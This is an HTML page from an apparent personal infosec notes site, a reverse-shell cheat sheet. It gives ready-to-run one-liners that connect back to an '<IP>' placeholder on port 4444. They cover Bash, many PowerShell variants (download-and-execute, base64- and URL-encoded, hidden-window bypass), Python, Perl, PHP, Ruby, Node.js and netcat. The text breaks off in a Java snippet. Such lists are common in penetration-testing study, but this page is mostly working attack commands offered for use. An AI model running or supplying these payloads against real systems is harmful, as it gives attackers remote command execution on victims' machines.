<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/reverse-shells</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/reverse-shells"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/now/">now</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>Reverse shells</h1>

<p>All reverse shell snippets are set with port <code>4444</code> on this page. Change <code>&lt;IP&gt;</code> fields with your attack box&#39;s address.</p>

<h2>Bash</h2>

<div class="highlight"><pre class="highlight shell"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1
</code></pre></div>

<h2>Powershell</h2>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># Run Invoke-PowerShellTcp.ps1 from memory. This requires</span><span class="w">
</span><span class="c"># to share the file with the target, for instance with</span><span class="w">
</span><span class="c"># python3 -m http.server 8080:</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"iex ((New-Object Net.WebClient).DownloadString('http://&lt;IP&gt;:8080/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress &lt;IP&gt; -Port 4444"</span><span class="w">

</span><span class="c"># You can also add the last command calling the reverse shell</span><span class="w">
</span><span class="c"># directly in Invoke-PowerShellTcp.ps1, and simply execute the module:</span><span class="w">
</span><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"iex ((New-Object Net.WebClient).DownloadString('http://&lt;IP&gt;:8080/Invoke-PowerShellTcp.ps1'))"</span><span class="w">

</span><span class="c"># Base64-encoded powershell, execute the output with powershell -e:</span><span class="w">
</span><span class="n">payload</span><span class="o">=</span><span class="s1">'$client = New-Object System.Net.Sockets.TCPClient("&lt;IP&gt;",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'</span><span class="p">;</span><span class="w"> </span><span class="n">utf16le_payload</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">echo</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"</span><span class="nv">$payload</span><span class="s2">"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">iconv</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">UTF-8</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">UTF-16LE</span><span class="p">);</span><span class="w"> </span><span class="n">base64_payload</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">echo</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"</span><span class="nv">$utf16le_payload</span><span class="s2">"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">0</span><span class="p">);</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$base64_payload</span><span class="s2">"</span><span class="w">

</span><span class="c"># Invoke-PowerShellTcp.ps1 reverse shell, interactive and base64-encoded too:</span><span class="w">
</span><span class="n">payload</span><span class="o">=</span><span class="s1">'try{$client=New-Object System.Net.Sockets.TCPClient("&lt;IP&gt;",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};$sendbytes=([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user "+$env:username+" on "+$env:computername+"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n");$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes=([text.encoding]::ASCII).GetBytes("PS "+(Get-Location).Path+"&gt;");$stream.Write($sendbytes,0,$sendbytes.Length);while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){$EncodedText=New-Object -TypeName System.Text.ASCIIEncoding;$data=$EncodedText.GetString($bytes,0,$i);try{$sendback=(Invoke-Expression -Command $data 2&gt;&amp;1|Out-String)}catch{Write-Warning "Something went wrong with execution of command on the target.";Write-Error $_}$sendback2=$sendback+"PS "+(Get-Location).Path+"&gt; ";$x=($error[0]|Out-String);$error.clear();$sendback2=$sendback2+$x;$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();if($listener){$listener.Stop()}};catch{Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port.";Write-Error $_}'</span><span class="p">;</span><span class="w"> </span><span class="n">utf16le_payload</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">echo</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"</span><span class="nv">$payload</span><span class="s2">"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">iconv</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">UTF-8</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">UTF-16LE</span><span class="p">);</span><span class="w"> </span><span class="n">base64_payload</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">echo</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="s2">"</span><span class="nv">$utf16le_payload</span><span class="s2">"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">0</span><span class="p">);</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$base64_payload</span><span class="s2">"</span><span class="w">

</span><span class="c"># One-liner powershell reverse shell:</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('&lt;IP&gt;',4444);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">

</span><span class="c"># Another reverse shell that seems more reliable:</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('&lt;IP&gt;',4444);</span><span class="nv">$s</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$b</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$s</span><span class="s2">.Read(</span><span class="nv">$b</span><span class="s2">, 0, </span><span class="nv">$b</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$b</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sb</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sb2</span><span class="s2"> = </span><span class="nv">$sb</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sbt</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sb2</span><span class="s2">);</span><span class="nv">$s</span><span class="s2">.Write(</span><span class="nv">$sbt</span><span class="s2">,0,</span><span class="nv">$sbt</span><span class="s2">.Length);</span><span class="nv">$s</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">

</span><span class="c"># Another one:</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-NoP</span><span class="w"> </span><span class="nt">-NonI</span><span class="w"> </span><span class="nt">-W</span><span class="w"> </span><span class="nx">Hidden</span><span class="w"> </span><span class="nt">-Exec</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="nx">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"&lt;IP&gt;"</span><span class="p">,</span><span class="mi">4444</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nx">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"PS "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">

</span><span class="c"># And another one:</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-W</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-noni</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$TCPClient</span><span class="s2"> = New-Object Net.Sockets.TCPClient('&lt;IP&gt;', 4444);</span><span class="nv">$NetworkStream</span><span class="s2"> = </span><span class="nv">$TCPClient</span><span class="s2">.GetStream();</span><span class="nv">$StreamWriter</span><span class="s2"> = New-Object IO.StreamWriter(</span><span class="nv">$NetworkStream</span><span class="s2">);function WriteToStream (</span><span class="nv">$String</span><span class="s2">) {[byte[]]</span><span class="nv">$</span><span class="nn">script</span><span class="p">:</span><span class="nv">Buffer</span><span class="s2"> = 0..</span><span class="nv">$TCPClient</span><span class="s2">.ReceiveBufferSize | % {0};</span><span class="nv">$StreamWriter</span><span class="s2">.Write(</span><span class="nv">$String</span><span class="s2"> + 'SHELL&gt; ');</span><span class="nv">$StreamWriter</span><span class="s2">.Flush()}WriteToStream '';while((</span><span class="nv">$BytesRead</span><span class="s2"> = </span><span class="nv">$NetworkStream</span><span class="s2">.Read(</span><span class="nv">$Buffer</span><span class="s2">, 0, </span><span class="nv">$Buffer</span><span class="s2">.Length)) -gt 0) {</span><span class="nv">$Command</span><span class="s2"> = ([text.encoding]::UTF8).GetString(</span><span class="nv">$Buffer</span><span class="s2">, 0, </span><span class="nv">$BytesRead</span><span class="s2"> - 1);</span><span class="nv">$Output</span><span class="s2"> = try {Invoke-Expression </span><span class="nv">$Command</span><span class="s2"> 2&gt;&amp;1 | Out-String} catch {</span><span class="bp">$_</span><span class="s2"> | Out-String}WriteToStream (</span><span class="nv">$Output</span><span class="s2">)}</span><span class="nv">$StreamWriter</span><span class="s2">.Close()"</span><span class="w">

</span><span class="c"># Url-encoded one-liner for web shells:</span><span class="w">
</span><span class="n">powershell</span><span class="o">%</span><span class="nx">20-c</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">22</span><span class="o">%</span><span class="nx">24client</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20New-Object</span><span class="o">%</span><span class="nx">20System.Net.Sockets.TCPClient</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">27</span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="o">%</span><span class="nx">27</span><span class="o">%</span><span class="nx">2C4444</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24stream</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24client.GetStream</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">5Bbyte</span><span class="o">%</span><span class="nx">5B</span><span class="o">%</span><span class="nx">5D</span><span class="o">%</span><span class="nx">5D</span><span class="o">%</span><span class="nx">24bytes</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">200..65535</span><span class="o">%</span><span class="nx">7C</span><span class="o">%</span><span class="nx">25</span><span class="o">%</span><span class="nx">7B0</span><span class="o">%</span><span class="nx">7D</span><span class="o">%</span><span class="nx">3Bwhile</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24i</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24stream.Read</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24bytes</span><span class="o">%</span><span class="nx">2C</span><span class="o">%</span><span class="nx">200</span><span class="o">%</span><span class="nx">2C</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24bytes.Length</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">20-ne</span><span class="o">%</span><span class="nx">200</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">7B</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24data</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">28New-Object</span><span class="o">%</span><span class="nx">20-TypeName</span><span class="o">%</span><span class="nx">20System.Text.ASCIIEncoding</span><span class="o">%</span><span class="nx">29.GetString</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24bytes</span><span class="o">%</span><span class="nx">2C0</span><span class="o">%</span><span class="nx">2C</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24i</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24sendback</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">28iex</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24data</span><span class="o">%</span><span class="nx">202</span><span class="o">%</span><span class="nx">3E</span><span class="o">%</span><span class="nx">261</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">7C</span><span class="o">%</span><span class="nx">20Out-String</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24sendback2</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24sendback</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">2B</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">27PS</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">27</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">2B</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">28pwd</span><span class="o">%</span><span class="nx">29.Path</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">2B</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">27</span><span class="o">%</span><span class="nx">3E</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">27</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24sendbyte</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">5Btext.encoding</span><span class="o">%</span><span class="nx">5D</span><span class="o">%</span><span class="nx">3A</span><span class="o">%</span><span class="nx">3AASCII</span><span class="o">%</span><span class="nx">29.GetBytes</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24sendback2</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24stream.Write</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24sendbyte</span><span class="o">%</span><span class="nx">2C0</span><span class="o">%</span><span class="nx">2C</span><span class="o">%</span><span class="nx">24sendbyte.Length</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24stream.Flush</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">7D</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24client.Close</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">22</span><span class="w">
</span></code></pre></div>

<h2>Python 2/3</h2>

<div class="highlight"><pre class="highlight python"><code><span class="c1"># Reverse shell 1:
</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="sh">"</span><span class="s">&lt;IP&gt;</span><span class="sh">"</span><span class="s">,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">-i</span><span class="sh">"</span><span class="s">]);</span><span class="sh">'</span>

<span class="c1"># Reverse shell 2:
</span><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="sh">"</span><span class="s">&lt;IP&gt;</span><span class="sh">"</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">4444</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(</span><span class="sh">"</span><span class="s">RHOST</span><span class="sh">"</span><span class="s">),int(os.getenv(</span><span class="sh">"</span><span class="s">RPORT</span><span class="sh">"</span><span class="s">))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(</span><span class="sh">"</span><span class="s">sh</span><span class="sh">"</span><span class="s">)</span><span class="sh">'</span>

<span class="c1"># Reverse shell 3:
</span><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="sh">"</span><span class="s">&lt;IP&gt;</span><span class="sh">"</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">4444</span><span class="p">;</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(</span><span class="sh">"</span><span class="s">RHOST</span><span class="sh">"</span><span class="s">),int(os.getenv(</span><span class="sh">"</span><span class="s">RPORT</span><span class="sh">"</span><span class="s">))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(</span><span class="sh">"</span><span class="s">sh</span><span class="sh">"</span><span class="s">)</span><span class="sh">'</span>

<span class="c1"># Reverse shell 4:
</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="sh">"</span><span class="s">&lt;IP&gt;</span><span class="sh">"</span><span class="s">,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(</span><span class="sh">"</span><span class="s">sh</span><span class="sh">"</span><span class="s">)</span><span class="sh">'</span>
</code></pre></div>

<h2>Perl</h2>

<div class="highlight"><pre class="highlight perl"><code><span class="nv">perl</span> <span class="o">-</span><span class="nv">e</span> <span class="p">'</span><span class="s1">use Socket;$i="&lt;IP&gt;";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};</span><span class="p">'</span>
</code></pre></div>

<h2>PHP</h2>

<div class="highlight"><pre class="highlight php"><code><span class="n">php</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'$sock=fsockopen("&lt;IP&gt;",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</code></pre></div>

<h2>Ruby</h2>

<div class="highlight"><pre class="highlight ruby"><code><span class="c1"># Reverse shell 1:</span>
<span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("&lt;IP&gt;",4444).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>

<span class="c1"># Reverse shell 2:</span>
<span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'spawn("sh",[:in,:out,:err]=&gt;TCPSocket.new("&lt;IP&gt;",4444))'</span>

<span class="c1"># Reverse shell without sh:</span>
<span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'exit if fork;c=TCPSocket.new("&lt;IP&gt;","4444");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'</span>
</code></pre></div>

<h2>Node.js</h2>

<div class="highlight"><pre class="highlight javascript"><code><span class="c1">// Reverse shell 1:</span>
<span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nf">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">nc -e sh &lt;IP&gt; 4444</span><span class="dl">'</span><span class="p">)</span>

<span class="c1">// Reverse shell 2:</span>
<span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">net</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">cp</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">),</span>
        <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="dl">"</span><span class="s2">sh</span><span class="dl">"</span><span class="p">,</span> <span class="p">[]);</span>
    <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nc">Socket</span><span class="p">();</span>
    <span class="nx">client</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="mi">4444</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&lt;IP&gt;</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
        <span class="nx">client</span><span class="p">.</span><span class="nf">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nf">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
        <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nf">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="c1">// Prevents the Node.js application from crashing</span>
<span class="p">})();</span>
</code></pre></div>

<h2>Netcat</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># With -e flag enabled:</span>
nc <span class="nt">-e</span> /bin/sh &lt;IP&gt; 4444

<span class="c"># If the -e flag is not supported, this might still work:</span>
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc &lt;IP&gt; 4444 <span class="o">&gt;</span>/tmp/f
</code></pre></div>

<h2>Java</h2>

<div class="highlight"><pre class="highlight java"><code><span class="n">r</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
